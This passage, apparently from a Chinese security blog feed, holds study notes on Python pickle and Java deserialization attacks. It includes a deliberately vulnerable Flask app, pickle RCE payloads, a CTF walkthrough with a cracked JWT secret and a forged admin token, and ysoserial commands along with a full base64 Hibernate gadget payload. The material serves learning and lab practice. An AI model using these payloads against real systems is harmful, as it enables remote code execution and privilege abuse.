class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br></pre></td></tr></table></figure><p>我们不做任何处理时，同样会弹出计算器，如下所示：</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920141539283.png" alt="image-20240920141539283"></p><p>当我们注释<code>loads</code>函数之后，执行脚本后不会出现任何反应</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920142034644.png" alt="image-20240920142034644"></p><p>这就和<code>__setstate__()</code>函数的性质有关，<code>__setstate__()</code>函数反序列化的时候才会被调用，可以参考<code>__reduce__()</code>函数的讲解</p><h1 id="反序列化漏洞构造"><a href="#反序列化漏洞构造" class="headerlink" title="反序列化漏洞构造"></a>反序列化漏洞构造</h1><p>我们首先在本地搭建一个在线网站，代码如下所示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Server服务器：</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)  <span class="comment">#字符串-&gt;对象，反序列化（但是没有看到魔法方法）</span></span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">    host=<span class="string">&#x27;10.133.224.99&#x27;</span>,</span><br><span class="line">    port=<span class="number">5000</span>,</span><br><span class="line">    debug=<span class="literal">True</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>我们试着访问该网站，对应的页面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920143400210.png" alt="image-20240920143400210"></p><p>我们首先分析代码，当cookie值存在的时候，会把cookie值传参给user，否则，就默认为Guest，由于我们并没有传递任何cookie参数，所以我们这里显示的是Hello Guest，我们这里可以利用其反序列化漏洞进行任意命令执行，如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a) <span class="comment">#序列化操作</span></span><br><span class="line">p_a_encode = base64.b64encode(p_a)</span><br><span class="line"><span class="built_in">print</span>(p_a_encode)</span><br></pre></td></tr></table></figure><p>运行后的结果为<code>gASVHAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjARjYWxjlIWUUpQu</code>，我们通过bp进行传参</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920145450731.png" alt="image-20240920145450731"></p><p>我们发现命令被成功执行，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920145604986.png" alt="image-20240920145604986"></p><p>这就是一个最简单的序列化漏洞的利用过程，我们可以将命令换成我们所需要的进行执行，甚至可以进行反弹shell操作</p><h1 id="CTF实例-CISCN2019华北"><a href="#CTF实例-CISCN2019华北" class="headerlink" title="CTF实例-CISCN2019华北"></a>CTF实例-CISCN2019华北</h1><p>我们首先打开该环境，发现关键信息，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/88a5482da4f68bb62e49a4ba2cb09c60.png" alt="88a5482da4f68bb62e49a4ba2cb09c60"></p><p>这里提示我们需要找到lv6，我们可发现这里有很多不同的页，所以我们这里考虑使用脚本进行每一页的遍历，找到lv6.png即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/fe73528c4cee34dce1d8daf01894a424.png" alt="fe73528c4cee34dce1d8daf01894a424"></p><p>我们编写脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://25953d8c-225a-4fd7-8a46-1106247dcbac.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    r = requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&quot;not find&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们运行相关的脚本，让其帮我们寻找到真正的lv6</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920200055897.png" alt="image-20240920200055897"></p><p>我们可以发现在181页，我们直接定向到相关的页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920200244941.png" alt="image-20240920200244941"></p><p>我们点击结算进行购买lv6，进行抓包，看看哪里可以进行越权，因为我们的初始金额只有1000，但是lv6需要1145141919，我们显然买不起，所以需要我们进行抓包改包进行分析</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/db5afd39c8109fc487618179c5810c2d.png" alt="db5afd39c8109fc487618179c5810c2d"></p><p>我们可以试着把discount改小，试一下可不可以成功获取到相关商品</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920201849619.png" alt="image-20240920201849619"></p><p>我们发现只允许admin访问，我们同样注意到有jwt身份验证，我们试着去破解一下jwt，看看能不能对jwt进行修改</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920202147154.png" alt="image-20240920202147154"></p><p>我们发现空加密在这里面不起作用，我们试着去爆破密钥，因为只有密钥获取之后我们才能将<code>xichao</code>修改成<code>admin</code>，我们通过jwt_tools爆破出来密钥为1Kun，我们可以通过1Kun重新生成密钥</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920204445245.png" alt="image-20240920204445245"></p><p>密钥为<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p><p>我们通过重新发包试着购买，可以发现成功购买到</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920204803358.png" alt="image-20240920204803358"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/781189ae9341f12995e77c108632b061.png" alt="781189ae9341f12995e77c108632b061"></p><p>我们下载这个zip文件，我们可以发现这个就是该网站的网站源码，我们进行代码审计，全局搜索pickle</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920210927758.png" alt="image-20240920210927758"></p><p>我们构造payload如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a) <span class="comment">#序列化操作</span></span><br><span class="line">p = urllib.parse.quote(p_a)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920212230522.png" alt="image-20240920212230522"></p><p>我们尝试将对应的生成的东西插入到其应当传参的地方，我们可以成功获得flag，至此本道题成功解出</p><h1 id="自动化审计bandit"><a href="#自动化审计bandit" class="headerlink" title="自动化审计bandit"></a>自动化审计bandit</h1><p>我们使用linux平台进行下载bandit进行自动审计</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install bandit</span><br></pre></td></tr></table></figure><p>我们使用bandit进行自动化分析刚刚的www源码，我们可以发现其自动给我们审计出来了很多信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920215022114.png" alt="image-20240920215022114"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/86eb39964d2cb8d283080aa5e5c8fb52.png" alt="86eb39964d2cb8d283080aa5e5c8fb52"></p><p>包括反序列化漏洞也被审计出来了，所以这个自动化工具还是很强的，我们可以经常利用bandit进行自动化代码审计</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 反序列化 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python反序列化 </tag>
            
            <tag> bandit自动审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-JAVA反序列化</title>
      <link href="/post/230db672.html"/>
      <url>/post/230db672.html</url>
      
        <content type="html"><![CDATA[<p>首先，Java序列化和反序列化的概念和PHP序列化和反序列化的概念类似，都是将对象转变为字节流（序列化）或者将字节流转变为对象（反序列化），只是实现的方式可能略有不同，我们接下来来认识一些序列化和反序列化的接口，如下所示</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Java:Serializable Extemalizable接☐、fastjson、jackson、gson、ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.</span><br><span class="line">ObjectYaml.loadXStream.fromXML.ObjectMapper.readValue.JSON.parseObject</span><br><span class="line">PHP:serialize(）unserialize(）</span><br><span class="line">Python:pickle</span><br></pre></td></tr></table></figure><p>java序列化之后的数据具有一定的特性，如果一段数据以rO0AB开头，我们可以确定这串就是JAVA序列化base64加密的数据，如果以aced开头，那么这段就是java序列化的16进制数据</p><h1 id="原生API-Ysoserial-URLDNS使用"><a href="#原生API-Ysoserial-URLDNS使用" class="headerlink" title="原生API-Ysoserial_URLDNS使用"></a>原生API-Ysoserial_URLDNS使用</h1><p>序列化操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialPerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;xiaodi&quot;</span>, <span class="number">28</span>, <span class="string">&quot;男&quot;</span>, <span class="number">101</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/person.txt&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;person 对象序列化成功！&quot;</span>);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title function_">deserialPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/x.txt&quot;</span>))</span><br><span class="line">       );</span><br><span class="line">       <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)ois.readObject();</span><br><span class="line">       System.out.println(<span class="string">&quot;person 对象反序列化成功！&quot;</span>);</span><br><span class="line">       <span class="comment">//Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line">       <span class="keyword">return</span> person;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>序列化后的操作结果，生成aced开头的字节流，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240902103346084.png" alt="image-20240902103346084"></p><p>我们使用二进制编辑器进行查看，可以看到其开头的aced标识，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/23747a542f101459fb6b9da6ec7fe546.png" alt="23747a542f101459fb6b9da6ec7fe546"></p><p>紧接着，我们调用反序列化代码进行反序列化，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8749310fa164dfb3e36a024b96622048.png" alt="8749310fa164dfb3e36a024b96622048"></p><p>以上就演示了最基本的java序列化与反序列化的过程，那么为什么会产生安全漏洞呢？安全漏洞的产生究竟是在哪出现的呢？这个时候，如果<code>d:/person.txt</code>如果能够控制的话，如果把这里面的内容进行修改，构造一个具有恶意攻击的代码，那么就可能造成攻击。那么如何进行构造呢？这个时候就需要用到最基本的java反序列化漏洞利用工具，其网址如下</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>我们试着去运行一下这个jar包，通过如下命令执行<code>java.exe -jar ysoserial-all.jar</code>，效果图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240902110359193.png" alt="image-20240902110359193"></p><p>最后一栏dependencies表示需要这些包才能够运行，所以这里我们先使用URLDNS进行演示，因为其不需要依赖其他的包</p><p>我们首先通过URLDNS来测试是否能够进行带外访问，首先使用命令<code>java.exe -jar ysoserial-all.jar URLDNS &quot;http://g73ovi.dnslog.cn&quot; &gt; a.txt</code>，下图就是我们生成的a.txt</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240902111056210.png" alt="image-20240902111056210"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2ff504ec64b803304d0f32eb8b49bace.png" alt="2ff504ec64b803304d0f32eb8b49bace"></p><p>接着我们进行反序列化，将我们生成的数据进行反序列化，然后我们去dnslog平台上，就可以发现我们实际上已经访问了该dns，即我们成功验证了反序列化漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240902111422724.png" alt="image-20240902111422724"></p><h1 id="三方组件-Ysoserial-支持库生成使用"><a href="#三方组件-Ysoserial-支持库生成使用" class="headerlink" title="三方组件-Ysoserial_支持库生成使用"></a>三方组件-Ysoserial_支持库生成使用</h1><p>我们这里使用webgoat上的java反序列化进行实验，首先我们登录webgoat，找到对应的java反序列化</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913111900036-893735498.png" alt="1647844481582-47689f65-a800-4f1e-bbce-d4dcdaba9874.png"></p><p>我们找到对应的源代码，载入jar包，打开对应的jar包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230913111900584-606741843.png" alt="1647845003754-172ce648-d358-403c-8aae-8f797d23bb49.png"></p><p>我们发现代码<code>ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)));</code>，我们找到其对应的引用的库，然后将对应的库复制到我们的工作目录下，然后使用下面的命令进行生成<code>java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;calc.exe&quot; &gt; x.bin</code></p><p>我们通过调用calc.exe来进行调用计算器进程，实现我们的延迟5s，我们查看生成的x.bin</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/ec2d1f37a04c479a536428fdc7b66fdb.png" alt="ec2d1f37a04c479a536428fdc7b66fdb"></p><p>我们发现是十六进制形式的数据，所以我们要通过脚本进行base64加密，我们使用如下的python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;x.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>生成的base64编码的数据流如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGXHO08ZYmxfcgIADVoAHGNyZWF0ZUVtcHR5Q29tcG9zaXRlc0VuYWJsZWRaABJoYXNOb3ROdWxsUHJvcGVydHlaAAVpc0tleUkADHByb3BlcnR5U3BhbkwAD2NhbkRvRXh0cmFjdGlvbnQAE0xqYXZhL2xhbmcvQm9vbGVhbjtbAAdjYXNjYWRldAAoW0xvcmcvaGliZXJuYXRlL2VuZ2luZS9zcGkvQ2FzY2FkZVN0eWxlO0wAEWNvbXBvbmVudFR1cGxpemVydAAxTG9yZy9oaWJlcm5hdGUvdHVwbGUvY29tcG9uZW50L0NvbXBvbmVudFR1cGxpemVyO0wACmVudGl0eU1vZGV0ABpMb3JnL2hpYmVybmF0ZS9FbnRpdHlNb2RlO1sAC2pvaW5lZEZldGNodAAaW0xvcmcvaGliZXJuYXRlL0ZldGNoTW9kZTtbAA1wcm9wZXJ0eU5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO1sAE3Byb3BlcnR5TnVsbGFiaWxpdHl0AAJbWlsADXByb3BlcnR5VHlwZXN0ABpbTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO1sAIXByb3BlcnR5VmFsdWVHZW5lcmF0aW9uU3RyYXRlZ2llc3QAJltMb3JnL2hpYmVybmF0ZS90dXBsZS9WYWx1ZUdlbmVyYXRpb247eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGXJFpSxstQ41AIAAHhwAAAAAAAAAXBwc3IAM29yZy5oaWJlcm5hdGUudHVwbGUuY29tcG9uZW50LlBvam9Db21wb25lbnRUdXBsaXplcsBwOcjTg59YAgAETAAOY29tcG9uZW50Q2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wACW9wdGltaXplcnQAMExvcmcvaGliZXJuYXRlL2J5dGVjb2RlL3NwaS9SZWZsZWN0aW9uT3B0aW1pemVyO0wADHBhcmVudEdldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hyADdvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudFR1cGxpemVy8vZxKVYnaN0CAAVaABJoYXNDdXN0b21BY2Nlc3NvcnNJAAxwcm9wZXJ0eVNwYW5bAAdnZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADGluc3RhbnRpYXRvcnQAIkxvcmcvaGliZXJuYXRlL3R1cGxlL0luc3RhbnRpYXRvcjtbAAdzZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hwAAAAAAB1cgArW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyOyaF+ANJPbfPAgAAeHAAAAABc3IAPW9yZy5oaWJlcm5hdGUucHJvcGVydHkuYWNjZXNzLnNwaS5HZXR0ZXJNZXRob2RJbXBsJFNlcmlhbEZvcm2sW7ZWyd0bWAIABEwADmNvbnRhaW5lckNsYXNzcQB+ABNMAA5kZWNsYXJpbmdDbGFzc3EAfgATTAAKbWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wADHByb3BlcnR5TmFtZXEAfgAfeHB2cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AB9MABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cHEAfgAldAATZ2V0T3V0cHV0UHJvcGVydGllc3QABHRlc3RwcHBwcHBwcHBwdXIAGltMb3JnLmhpYmVybmF0ZS50eXBlLlR5cGU7fq+roeSVYZoCAAB4cAAAAAFxAH4AEXBzcQB+ACEAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaayv66vgAAADQAOQoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWBwA3AQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAB0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEBAAxJbm5lckNsYXNzZXMHACcBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAceXNvc2VyaWFsL1B3bmVyNjk3Njk4OTI0NDUwMAEAHkx5c29zZXJpYWwvUHduZXI2OTc2OTg5MjQ0NTAwOwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA4AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA4AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA4AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEABwAmACgACXVxAH4ALQAAAdTK/rq+AAAANAAbCgACAAMHAAQMAAUABgEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYHAAgBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcACgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAEAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAA8ABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAcAGAAaAAlwdAAEUHducnB3AQB4cQB+AAVzcQB+AAJxAH4AEXEAfgAqcQB+ADF4</span><br></pre></td></tr></table></figure><p>我们将这串数据填入，可以发现计算器被弹出</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240902144343237.png" alt="image-20240902144343237"></p><p>这就是利用其外部库生成相关payload</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 反序列化 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-PHP反序列化之魔术方法</title>
      <link href="/post/1dbb9975.html"/>
      <url>/post/1dbb9975.html</url>
      
